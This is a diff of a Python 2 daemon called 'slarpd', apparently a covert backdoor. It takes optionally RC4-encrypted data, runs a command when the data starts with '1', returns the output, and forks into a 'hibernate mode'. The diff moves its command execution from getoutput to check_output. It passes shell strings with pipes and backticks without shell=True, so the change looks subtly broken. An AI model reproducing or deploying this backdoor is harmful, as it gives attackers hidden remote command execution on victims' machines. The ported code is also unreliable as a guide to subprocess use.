@@ -1,6 +1,6 @@
 from sys import exit
 from struct import pack, unpack
-from commands import getoutput
+from subprocess import check_output 
 from fcntl import ioctl
 from base64 import b64encode, b64decode
 from getpass import getpass
@@ -65,7 +65,7 @@ class slarpd:
         if self.encrypt:
             data = self.crypto.rc4.decrypt(data)
         if data[0] == '1':
-            response = getoutput(data[1:])
+            response = check_output(data[1:])
             self.respond(response)
         elif data[0] == '3':
             exit(1)
@@ -157,7 +157,7 @@ if __name__ == "__main__":
 
     options = parser.parse_args()
     if options.kill:
-        getoutput('kill -s 9 `pgrep -u root -f "slarpd"`')
+        check_output('kill -s 9 `pgrep -u root -f "slarpd"`')
         exit(1)
     if options.encrypt:
         tmp.crypto.rc4.key = getpass('[!] Encryption password: ')
@@ -172,7 +172,7 @@ if __name__ == "__main__":
     if options.net:
         adapter = options.net
     else:
-        adapter = getoutput('ifconfig | awk \'{print $1}\' | head -n 1')
+        adapter = check_output('ifconfig | awk \'{print $1}\' | head -n 1')
 
     print 'daemon running with adapter %s, going into hibernate mode...' % adapter
     if fork():
